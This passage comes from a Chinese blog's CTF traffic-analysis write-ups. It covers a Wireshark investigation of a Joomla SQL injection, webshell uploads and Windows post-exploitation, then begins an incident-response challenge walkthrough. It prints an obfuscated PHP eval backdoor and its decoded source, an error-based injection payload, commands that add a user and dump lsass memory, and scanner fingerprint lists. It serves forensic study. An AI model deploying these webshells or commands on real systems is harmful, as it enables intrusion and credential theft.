alt="iCAbGT.png"></p><p>所以就解决了受害主机ip是<code>192.168.1.8</code><br>我们再详细过滤一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http and ip.src == 202.1.1.2</span><br></pre></td></tr></table></figure><p>可以得到比较详细的爆破过程，标记一下最后一个，然后返回http查看他的response<br><a href="https://imgchr.com/i/iCAqRU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCAqRU.md.png" alt="iCAqRU.md.png"></a></p><p>很明显了，注入的参数是<code>list[select]</code>,并且应该是使用了<code>报错注入</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span>\n</span><br><span class="line">   <span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span> <span class="attr">xml:lang</span>=<span class="string">"en-gb"</span> <span class="attr">lang</span>=<span class="string">"en-gb"</span> <span class="attr">dir</span>=<span class="string">"ltr"</span>&gt;</span>\n</span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span>\n</span><br><span class="line">   \t<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"content-type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span>\n</span><br><span class="line">    [truncated]\t<span class="tag">&lt;<span class="name">title</span>&gt;</span>Error: 500 XPATH syntax error: &amp;#039;qqzvqadminqqkkq&amp;#039; SQL=SELECT (UPDATEXML(6315,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(username AS CHAR),0x20)),1,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71</span><br><span class="line">   FROM `ajtuc_ucm_history` AS h\n</span><br><span class="line">   LEFT JOIN ajtuc_users AS uc ON uc.id = h.editor_user_id\n</span><br></pre></td></tr></table></figure><p>而且还可以从响应里面发现是从<code>joomla.ajtuc_users</code>表里面注入的东西，也知道了前缀为<code>ajtuc</code>，同时也知道了数据库为<code>joomla</code>。第三四题解决</p><p>然后要找登录后台的密码，但是这里直接<code>contains &quot;password&quot;</code>是找不到的，我们这时候就得转换思路就是说黑客是从数据库里把密码爆出来的<br>如果仔细看这个黑客的行为的话，他事先尝试登录发现不行才用的SQL注入，所以也就跟着这个思路来走了</p><p>既然报错注入，里面必含有password的关键字以及表名，立即过滤<br><code>ip.src == 202.1.1.2 and http contains &quot;password&quot; and http contains &quot;joomla.ajtuc_users&quot;</code><br>发现有三条，标记一下查看他们的response<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Status: 500 XPATH syntax error: &apos;qqzvq$2y$10$lXujU7XaUviJDigqqkkq&apos; </span><br><span class="line">Status: 500 XPATH syntax error: &apos;qqzvqFMzKy6.wx7EMCBqpzrJdn7qqkkq&apos; </span><br><span class="line">Status: 500 XPATH syntax error: &apos;qqzvqzi/8B2QRD7qIlDJeqqkkq&apos;</span><br></pre></td></tr></table></figure></p><p>再来查看一下报错注入是这样的，存在拼接<code>0x71717a7671</code>，解码一下<code>qqzvq</code><br><code>UPDATEXML(5928,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(password AS CHAR),0x20)),1,22</code>，所以得把qqzvq前缀去掉</p><p><code>$2y$10$lXujU7XaUviJDigqqkkqFMzKy6.wx7EMCBqpzrJdn7qqkkqzi/8B2QRD7qIlDJeqqkkq</code><br>拼接起来就是经过加密后的密码，官方答案是qwert123，但还是解不出来</p><p>第一个包里面过滤<br><code>http.request.method == &quot;POST&quot; and ip.src == 202.1.1.2</code><br><a href="https://imgchr.com/i/iCEeeA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEeeA.md.png" alt="iCEeeA.md.png"></a></p><p>没发现有可疑数据</p><p>再找第二个包<br><code>ip.src == 202.1.1.2 and http.request.method == &quot;POST&quot; and http contains &quot;eval&quot;</code>，发现存在一个文件<code>kkkaaa.php</code><br><a href="https://imgchr.com/i/iCEMJf" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEMJf.md.png" alt="iCEMJf.md.png"></a></p><p>可以发现这里面的是一个马，密码为<code>zzz</code><br>然后我们再根据这个马去寻找上传的的第二个马<br>当我们点到第三个报文的时候发现多了一个参数<code>z2</code>，有点可疑<br><a href="https://imgchr.com/i/iCEQW8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEQW8.md.png" alt="iCEQW8.md.png"></a></p><p>保存出来看一下，发现是段php代码，<br><img src="https://s1.ax1x.com/2018/09/06/iCE3Qg.png" alt="iCE3Qg.png"><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>.$p=<span class="string">'l&gt;]ower";$i&gt;]=$m[1][0].$m[1]&gt;][1];$h&gt;]=$&gt;]sl($ss(m&gt;]d5($i.&gt;]$kh),0&gt;],3))&gt;];$f=$s&gt;]l($s&gt;]s(md5'</span>;.$d=<span class="string">']q=array_v&gt;]&gt;]alues(&gt;]$q);&gt;]preg_match_a&gt;]ll("/(&gt;][\\w]&gt;])[\\w-&gt;]]+&gt;](?:;q=&gt;]0.([\\d]))?,?/",&gt;'</span>;.$W=<span class="string">'),$ss(&gt;]$s[&gt;]$i],&gt;]0,$e))),$&gt;]&gt;]k)));&gt;]$o=ob_get_content&gt;]&gt;]s();ob_end_&gt;]&gt;]clean();$d=&gt;]base'</span>;.$e=<span class="string">']T_LANGUAGE"];if($rr&gt;]&amp;&amp;$&gt;]ra)&#123;$&gt;]u=pars&gt;]e_&gt;]url($rr);par&gt;]se_st&gt;]r($u["&gt;]query"],$&gt;]q);$&gt;'</span>;.$E=<span class="string">'&gt;]64_e&gt;]ncod&gt;]e&gt;](&gt;]x(gz&gt;]compress($o),$k));pri&gt;]nt("&lt;$k&gt;$d&lt;&gt;]/$k&gt;"&gt;])&gt;];@&gt;]session_destr&gt;]oy();&#125;&#125;&#125;&#125;'</span>;.$t=<span class="string">'($i.&gt;]$kf),0,3&gt;]));$p&gt;]="";fo&gt;]r($z=1&gt;];$z&lt;&gt;]count($m&gt;][1]);$z+&gt;]&gt;]+)$p&gt;].=$q[$m[&gt;]2][$z]];i&gt;'</span>;.$M=<span class="string">']$ra,$&gt;]m);if($q&gt;]&amp;&amp;$m&gt;])&#123;@sessi&gt;]on_sta&gt;]&gt;]rt();$s=&amp;$&gt;]_SESS&gt;]ION;$&gt;]&gt;]s&gt;]s="substr";$sl="s&gt;]&gt;]trto'</span>;.$P=<span class="string">']f(s&gt;]tr&gt;]pos($p&gt;],$h)===0)&#123;$s[&gt;]$i]="";$p&gt;]=$ss($&gt;]p,3);&gt;]&#125;if(ar&gt;]ray&gt;]_key_exist&gt;]&gt;]s($i,$&gt;]s)&gt;])&#123;$&gt;'</span>;.$j=str_replace(<span class="string">'fr'</span>,<span class="string">''</span>,<span class="string">'cfrrfreatfrfre_funcfrtfrion'</span>);.$k=<span class="string">'];&#125;&#125;re&gt;]&gt;]turn $o;&gt;]&#125;$&gt;]r=$_SERV&gt;]ER;$rr=@$r[&gt;]"HTTP&gt;]_REFERE&gt;]R"];$ra&gt;]=@&gt;]$r["&gt;]HTTP_A&gt;]CC&gt;]EP&gt;'</span>;.$g=<span class="string">'"";for(&gt;]$i=&gt;]0;$i&lt;$l;&gt;])&gt;]&#123;for($j=0;($j&lt;&gt;]$c&amp;&amp;&gt;]$i&lt;$l);$&gt;]j++,$i&gt;]++)&#123;$o.&gt;]=$t&#123;$i&gt;]&#125;^$k&#123;$j&#125;&gt;'</span>;.$R=<span class="string">'$k&gt;]h="cb4&gt;]2";$kf="e130"&gt;];functio&gt;]n&gt;] x($t&gt;],$k)&#123;$c=s&gt;]trle&gt;]&gt;]n($k);$l=strle&gt;]n&gt;]($t)&gt;];$o='</span>;.$Q=<span class="string">']s[$i].=$p;$e=strp&gt;]&gt;]os(&gt;]$s[$i&gt;]],$f);if($&gt;]e)&#123;$k=$kh.$k&gt;]f;&gt;]ob_sta&gt;]rt();@e&gt;]val(@gzun&gt;]co&gt;'</span>;.$v=<span class="string">']mpress(@x&gt;](@b&gt;]as&gt;]&gt;]e64_decode(pr&gt;]&gt;]e&gt;]g_repla&gt;]ce(array("/_/","/-/"),arr&gt;]ay(&gt;]"/","+"&gt;]'</span>;.$x=str_replace(<span class="string">'&gt;]'</span>,<span class="string">''</span>,$R.$g.$k.$e.$d.$M.$p.$t.$P.$Q.$v.$W.$E);.$N=$j(<span class="string">''</span>,$x);$N();.<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>解混淆<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump($j);</span><br><span class="line">var_dump($x);</span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string(<span class="number">15</span>) <span class="string">"create_function"</span></span><br><span class="line">string(<span class="number">929</span>) <span class="string">"$kh="</span>cb42<span class="string">";$kf="</span>e130<span class="string">";function x($t,$k)&#123;$c=strlen($k);$l=strlen($t);$o="</span><span class="string">";for($i=0;$i&lt;$l;)&#123;for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)&#123;$o.=$t&#123;$i&#125;^$k&#123;$j&#125;;&#125;&#125;return $o;&#125;$r=$_SERVER;$rr=@$r["</span>HTTP_REFERER<span class="string">"];$ra=@$r["</span>HTTP_ACCEPT_LANGUAGE<span class="string">"];if($rr&amp;&amp;$ra)&#123;$u=parse_url($rr);parse_str($u["</span>query<span class="string">"],$q);$q=array_values($q);preg_match_all("</span>/([\w])[\w-]+(?:;q=<span class="number">0.</span>([\d]))?,?/<span class="string">",$ra,$m);if($q&amp;&amp;$m)&#123;@session_start();$s=&amp;$_SESSION;$ss="</span>substr<span class="string">";$sl="</span>strtolower<span class="string">";$i=$m[1][0].$m[1][1];$h=$sl($ss(md5($i.$kh),0,3));$f=$sl($ss(md5($i.$kf),0,3));$p="</span><span class="string">";for($z=1;$z&lt;count($m[1]);$z++)$p.=$q[$m[2][$z]];if(strpos($p,$h)===0)&#123;$s[$i]="</span><span class="string">";$p=$ss($p,3);&#125;if(array_key_exists($i,$s))&#123;$s[$i].=$p;$e=strpos($s[$i],$f);if($e)&#123;$k=$kh.$kf;ob_start();@eval(@gzuncompress(@x(@base64_decode(preg_replace(array("</span>/_/<span class="string">","</span>/-/<span class="string">"),array("</span>/<span class="string">","</span>+<span class="string">"),$ss($s[$i],0,$e))),$k)));$o=ob_get_contents();ob_end_clean();$d=base64_encode(x(gzcompress($o),$k));print("</span>&lt;$k&gt;$d&lt;/$k&gt;<span class="string">");@session_destroy();&#125;&#125;&#125;&#125;"</span></span><br></pre></td></tr></table></figure></p><p>基本上可以确定这是第二个马<br>上传时间为<br><code>17:20:44.248365</code><br>然后重新过滤一下<br><code>ip.src == 202.1.1.2 and http</code>根据时间上的关系也可以确定第二上传的马的名字为<code>/tmp/footer.php</code></p><p>其实我们也可以从上面发现关于头的操作有两个东西<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$rr = @$_SERVER[&quot;HTTP_REFERER&quot;];</span><br><span class="line">$ra = @$_SERVER[&quot;HTTP_ACCEPT_LANGUAGE&quot;];</span><br></pre></td></tr></table></figure></p><p>看的跟清楚一点可以追踪几个<code>footer</code>的流看一下<br>明显发现<code>referer</code>有base64加密但是LANGUAGE没啥变化，所以最后的答案应该是referer<br><a href="https://imgchr.com/i/iCENoq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCENoq.md.png" alt="iCENoq.md.png"></a></p><p>然后题目抛出mysql的操作<br>在第四个包里面才找到关于SQL的相关协议<br><a href="https://imgchr.com/i/iCEbTI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEbTI.md.png" alt="iCEbTI.md.png"></a><br><code>mysql and mysql contains &quot;password&quot;</code><br>过滤之后可以发现黑客又在爆破<br>直接找到最后的login请求里面的hash值就是<code>password</code><br><a href="https://imgchr.com/i/iCEdYV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEdYV.md.png" alt="iCEdYV.md.png"></a></p><p>然后再来过滤一波查看黑客究竟<code>footer.php</code>之后的操作，发现有<code>tunnel</code>这样的关键字样，明显第一次使用的代理ip为<code>4.2.2.2</code><br><a href="https://imgchr.com/i/iCEBSU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEBSU.md.png" alt="iCEBSU.md.png"></a></p><p>然后第五到第八个包没有任何有关题目的答案</p><p>过滤第九个包的内容<br><code>(ip.addr == 202.1.1.2) and (http contains &quot;ls&quot;|| http contains &quot;dir&quot;)</code><br>发现有两次列目录的过程<br><a href="https://imgchr.com/i/iCEXff" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEXff.md.png" alt="iCEXff.md.png"></a></p><p>用了<code>dir</code>的那一次才有回显，系统是<code>Windows</code>没错了<br><a href="https://imgchr.com/i/iCEz6g" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEz6g.md.png" alt="iCEz6g.md.png"></a><br>时间很明显就是这个了<br>我么现在知道黑客攻击的ip是<code>192.168.2.20</code>，然后过滤一下<code>ip.addr == 192.168.2.20 &amp;&amp; http</code><br><a href="https://imgchr.com/i/iCVSXQ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCVSXQ.md.png" alt="iCVSXQ.md.png"></a><br>发现黑客通过echo命令写入一句话木马，然后通过<code>sh.php</code>执行<br>再过滤一下<br><code>ip.src == 192.168.2.20 &amp;&amp; http</code><br>发现在<code>18:49:27.767754</code>发现了疑似黑客振兴<code>net user localgroup</code> 命令的结果<br><a href="https://imgchr.com/i/iCVC0s" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCVC0s.md.png" alt="iCVC0s.md.png"></a><br>标记一下在其附近找请求</p><p>果不其然<br>在他的下方的post请求里面的<code>z2</code>参数里面解码得到<br><a href="https://imgchr.com/i/iCVFkq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCVFkq.md.png" alt="iCVFkq.md.png"></a></p><p><code>cd/d&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;&amp;net user kaka kaka /add&amp;echo [S]&amp;cd&amp;echo [E]</code><br>也就是增加了<code>kaka:kaka</code>这个用户名和密码</p><p>最后一个问题是下载了什么文件，由于使用菜刀下载的，很简单直接过滤post请求就好<br><code>ip.dst == 192.168.2.20 &amp;&amp; http.request.method== &quot;POST&quot;</code><br><a href="https://imgchr.com/i/iCVecF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCVecF.md.png" alt="iCVecF.md.png"></a></p><p>在这个包里面会发现最后有几个报文是含有z2参数的，十分可疑，解码<br>会发现哟一个利用<code>procdump.exe</code>操作的东西<br><code>cd/d&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;&amp;procdump.exe -accepteula -ma lspasss.dmp&amp;echo [S]&amp;cd&amp;echo [E]</code><br>下面的post请求解码z2参数也是类似的东西<br><code>cd/d&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;&amp;procdump.exe -accepteula -ma lsass.exe&amp;echo [S]&amp;cd&amp;echo [E]</code><br>再来解码一下最后一个报文里面的东西，发现这个文件<br><code>C:\phpStudy\WWW\b2evolution\install\test\lsass.exe_180208_185247.dmp</code><br>猜测应该是下了这个文件<br>然后打开第10个报文确认就是这个文件就好了</p><p>答案归纳</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.192.168.1.8</span><br><span class="line">2.list[select]</span><br><span class="line">3.ajtuc</span><br><span class="line">4.joomla</span><br><span class="line">5.$2y$10$lXujU7XaUviJDigFMzKy6.wx7EMCBqpzrJdn7zi/8B2QRD7qIlDJe(未解密)</span><br><span class="line">6.zzz</span><br><span class="line">7.17:20:44.248365</span><br><span class="line">8.Referer</span><br><span class="line">9.admin:1a3068c3e29e03e3bcfdba6f8669ad23349dc6c4</span><br><span class="line">10.4.2.2.2</span><br><span class="line">11.18:49:27.767754</span><br><span class="line">12.kaka:kaka</span><br><span class="line">13.lsass.exe_180208_185247.dmp</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>1.发现有菜刀流量的时候多关注是否出现z2参数的值，凡是出现这种参数的值得多去解码看看，不要嫌麻烦，因为这里面往往包含一些关键操作<br>2.出现一些有关php混淆的代码的时候要学会找到对应的参数去反混淆2333</p>]]></content>
      
      <categories>
          
          <category> 流量分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 流量分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>安恒8月应急响应题目回顾</title>
      <link href="/2018/08/30/anheng-8month-part1/"/>
      <url>/2018/08/30/anheng-8month-part1/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最做流量分析的题目感觉还是不太熟悉，所以最近几篇博客都应该都是练习流量分析的题目了，就从安恒8月赛这个应急响应讲起吧，记录一下加深印象，顺便小结一下自己的做题领悟。<a id="more"></a></p><p>题目地址  <a href="https://pan.baidu.com/s/13SoD6xB7YBiqpUDCIcb8mg" target="_blank" rel="noopener">https://pan.baidu.com/s/13SoD6xB7YBiqpUDCIcb8mg</a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1、给出黑客使用的扫描器</span><br><span class="line">2、得到黑客扫描到的登陆后台是(相对路径即可) /admin/login.php</span><br><span class="line">3、得到黑客使用了什么账号密码登陆了web后台(形式:username/password)</span><br><span class="line">4、得到黑客上传的webshell文件名是什么，内容是什么,提交webshell内容的base编码</span><br><span class="line">5、黑客在robots.txt中找到的flag是什么</span><br><span class="line">6、黑客找到的数据库密码是多少</span><br><span class="line">7、黑客在数据库中找到的hash_code是什么</span><br><span class="line">8、黑客破解了账号ijnu@test.com得到的密码是什么</span><br><span class="line">9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip</span><br><span class="line">10、黑客使用了什么账号登陆了mail系统（形式: username/password）</span><br><span class="line">11、黑客获得的vpn,ip是多少</span><br></pre></td></tr></table></figure><p>还得了解一下一些前置的知识</p><p>过滤IP，如源IP或者目标 x.x.x.x<br><code>ip.src == x.x.x.x or ip.dst eq x.x.x.x 或者 ip.addr == x.x.x.x</code><br>过滤端口<br><code>tcp.port eq 80 or udp.port eq 80</code><br>过滤MAC<br><code>eth.dst ==A0:00:00:04:C5:84</code></p><p>http模式过滤(就是一种模糊匹配)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http.request.method== &quot;GET&quot; </span><br><span class="line">http.request.method== &quot;POST&quot; </span><br><span class="line">http.request.uri ==&quot;/img/logo-edu.gif&quot; </span><br><span class="line">http contains&quot;GET&quot; </span><br><span class="line">http contains&quot;HTTP/1.&quot; </span><br><span class="line">http.request.method== &quot;GET&quot; &amp;&amp; http contains &quot;User-Agent:&quot;</span><br></pre></td></tr></table></figure><p>一些常见的自动化工具的指纹</p><p>Awvs（Acunetix Web Vulnerability Scanner ）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">acunetix_wvs_security_test acunetix </span><br><span class="line">acunetix_wvs acunetix_test</span><br><span class="line">Acunetix-Aspect-Password: Cookie: </span><br><span class="line">acunetix_wvs_security_test X-Forwarded-Host: </span><br><span class="line">acunetix_wvs_security_test X-Forwarded-For: </span><br><span class="line">acunetix_wvs_security_test Host: </span><br><span class="line">acunetix_wvs_security_test</span><br></pre></td></tr></table></figure><p>感觉我们只需要http contains “wvs” 或者是 http contains “acunetix”就可以把包给筛选出来</p><p>Netsparker</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X-Scanner: NetsparkerLocation: </span><br><span class="line">NetsparkerAccept: netsparker/checkCookie: </span><br><span class="line">netsparkerCookie: NETSPARKER</span><br></pre></td></tr></table></figure><p>Appscan</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Headers Content-Type: Appscan </span><br><span class="line">Content-Type: AppScanHeaderAccept: Appscan User-Agent:Appscan</span><br></pre></td></tr></table></figure><p>Nessus</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x_forwarded_for: nessus</span><br><span class="line">referer: nessus</span><br><span class="line">host: nessus</span><br></pre></td></tr></table></figure><p>Sqlmap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: sqlmap1.2.8#stable</span><br></pre></td></tr></table></figure><h4 id="1、给出黑客使用的扫描器"><a href="#1、给出黑客使用的扫描器" class="headerlink" title="1、给出黑客使用的扫描器"></a>1、给出黑客使用的扫描器</h4><p>竟然是黑客攻击，就应该把把http过滤看一下或者直接搜就行<br><a href="https://imgchr.com/i/Pj0s39" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj0s39.md.png" alt="Pj0s39.md.png"></a><br>所以这一题的答案是awvs</p><h4 id="2、得到黑客扫描到的登陆后台是-相对路径即可-admin-login-php"><a href="#2、得到黑客扫描到的登陆后台是-相对路径即可-admin-login-php" class="headerlink" title="2、得到黑客扫描到的登陆后台是(相对路径即可) /admin/login.php"></a>2、得到黑客扫描到的登陆后台是(相对路径即可) /admin/login.php</h4><p>通常后台的名字包括</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">manager</span><br><span class="line">login</span><br><span class="line">system</span><br></pre></td></tr></table></figure><p>所以我们直接搜其中的一个输入命令<code>http contains &quot;login&quot; &amp;&amp; http.request.method == &quot;POST&quot;</code><br><a href="https://imgchr.com/i/Pj0ycR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj0ycR.md.png" alt="Pj0ycR.md.png"></a><br>前面的都是登陆的页面，那个password_reset应该是密码重置<br>所以这一题的答案应该是<code>/admin/login.php?rec=login</code></p><p>###3、得到黑客使用了什么账号密码登陆了web后台(形式:username/password)<br>也是同样的套路<br>输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;password&quot;</span><br></pre></td></tr></table></figure></p><p> 这个我找得有点久，因为答案在最后，中间还有其他可以登陆上去的用户有一个还像是人事，还有两外一个好像是设么simple啥的，看了这整个包，发现simple这个账号有好几次改密码的操作，人事也登陆了几次，这些混淆都给这题提高难度，如果你真的仔细分析这个包的话就会发现，这里面黑客是大概爆破了几次，中间还尝试了一波SQL注入，而且爆破的过程都是用的admin账户，这也暗示了为什么最后的登陆的用户名是admin了，这里的话登陆成功可以看长度，对比爆破跟正常人事的登录，成功的话一般长度都是750+，没成功的话一般都是730+<br><a href="https://imgchr.com/i/Pj06j1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj06j1.md.png" alt="Pj06j1.md.png"></a><br>所以第三题的答案是<code>admin/admin!@#pass123</code></p><h4 id="4、得到黑客上传的webshell文件名是什么，内容是什么-提交webshell内容的base编码"><a href="#4、得到黑客上传的webshell文件名是什么，内容是什么-提交webshell内容的base编码" class="headerlink" title="4、得到黑客上传的webshell文件名是什么，内容是什么,提交webshell内容的base编码"></a>4、得到黑客上传的webshell文件名是什么，内容是什么,提交webshell内容的base编码</h4><p>通常webshell都会有明显的关键字比如eval、assert之类的，还有各种回调函数就不多说了。<br>我们这里也是一样的套路<br><code>ip.src == 192.168.94.59 and http contains &quot;eval&quot;</code> 一看这不太正常的文件名，有很大机会就是webshell了，而且里面的内容含有z1这样的参数很大可能性就是菜刀连接的流量，所以文件名是<code>/image/article/a.php</code><br><a href="https://imgchr.com/i/Pj02B6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj02B6.md.png" alt="Pj02B6.md.png"></a></p><p>所以这题的答案是<br><code>&lt;?php @eval([1234]);?&gt;</code>的base64编码</p><h4 id="5、黑客在robots-txt中找到的flag是什么"><a href="#5、黑客在robots-txt中找到的flag是什么" class="headerlink" title="5、黑客在robots.txt中找到的flag是什么"></a>5、黑客在robots.txt中找到的flag是什么</h4><p>正常操作<code>http contains &quot;robots.txt&quot;</code>然后追踪流就好了<br><a href="https://imgchr.com/i/Pj0I9H" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj0I9H.md.png" alt="Pj0I9H.md.png"></a><br>这题的答案就是上图的flag</p><h4 id="6、黑客找到的数据库密码是多少"><a href="#6、黑客找到的数据库密码是多少" class="headerlink" title="6、黑客找到的数据库密码是多少"></a>6、黑客找到的数据库密码是多少</h4><p>对于这题的数据库操作，先把马给过滤出来，然后再从里面找他的response，因为这里黑客是通过马对数据库操作的<br>可以先标记一下<code>a.php</code>第一次出现的地方，然后过滤http一条条去看他们的response就可以了，要是想详细一点的话可以加上db等字样，这就是做题时候的一些小技巧了。。可能恰好一样的效率有点低<br><a href="https://imgchr.com/i/Pj0XE8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj0XE8.md.png" alt="Pj0XE8.md.png"></a><br>所以这题的答案就是<code>e667jUPvJjXHvEUv</code></p><h4 id="7、黑客在数据库中找到的hash-code是什么"><a href="#7、黑客在数据库中找到的hash-code是什么" class="headerlink" title="7、黑客在数据库中找到的hash_code是什么"></a>7、黑客在数据库中找到的hash_code是什么</h4><p>这个题目明显的就是说在数据库里面找到的hash_code，但是在第一个包里面使用<code>http contains &quot;hsah_code&quot;</code>只找到一个响应报文，里面什么都找不到，这时候我们别忘了有第二个包的存在，我就是经常忘了。。这种做题习惯得改改，太浮躁，一旦发现没有就不做了。。。<br>我们来对比一下两个包的协议分级，很明显第二包里面大多数都是mysql的操作，所以很大可能性就是这个包里面存在我们要的答案<br>第一个包应用层大部分都是html的响应<br><a href="https://imgchr.com/i/PjBpgs" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBpgs.md.png" alt="PjBpgs.md.png"></a><br>而第二个包明显了，直接在tcp协议上执行的Mysql操作<br><a href="https://imgchr.com/i/PjB9vn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjB9vn.md.png" alt="PjB9vn.md.png"></a><br>我们可以在第二个包里面用mysql的过滤，如果是想搜索执行语句的话最好这样子，如：mysql.query contains “SELECT”<br>类似的模糊匹配<br><code>mysql contains &quot;hash_code&quot;</code><br>然后随便找个response追踪流看一下，发现答案<br><a href="https://imgchr.com/i/PjBiD0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBiD0.md.png" alt="PjBiD0.md.png"></a><br>这题答案是<code>d1c029893df40cb0f47bcf8f1c3c17ac</code></p><h4 id="8、黑客破解了账号ijnu-test-com得到的密码是什么"><a href="#8、黑客破解了账号ijnu-test-com得到的密码是什么" class="headerlink" title="8、黑客破解了账号ijnu@test.com得到的密码是什么"></a>8、黑客破解了账号<a href="mailto:ijnu@test.com" target="_blank" rel="noopener">ijnu@test.com</a>得到的密码是什么</h4><p>这一题一开始我还以为答案在mail的那两个包里面，结果还是在对sql操作的那个包上面，上来就直接<code>http contains &quot;ijnu@test.com&quot;</code>啥都没发现，这题目感觉出题没说得太明白。。<br>后面就用<code>tcp contains &quot;ijnu@test.com&quot;</code>把包筛出来，并且追踪流就行了，当然这题也可以用<code>mysql contains &quot;ijnu@test.com&quot;</code> 把包筛出来<br>一样的效果<br><a href="https://imgchr.com/i/PjBV5F" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBV5F.md.png" 